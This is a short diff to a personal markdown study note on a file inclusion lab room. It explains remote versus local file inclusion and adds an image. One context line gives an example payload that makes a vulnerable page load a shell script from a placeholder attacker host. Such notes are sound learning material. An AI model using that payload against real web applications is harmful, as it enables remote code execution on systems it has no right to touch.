@@ -18,6 +18,7 @@ In the **File Inclusion** room, I learned about file inclusion vulnerabilities a
 - **Lesson:** I discovered how some applications allow external URLs to be loaded as files.
 - **Example:** Supplying `page=http://attacker.com/shell.txt` can let an attacker execute malicious code.
 - **Takeaway:** RFI is more severe than LFI and can lead directly to remote code execution if `allow_url_include` is enabled.
+<img width="512" height="295" alt="image" src="https://github.com/user-attachments/assets/a27ab862-591e-4dd6-992a-364a473d6259" />
 
 ---
 
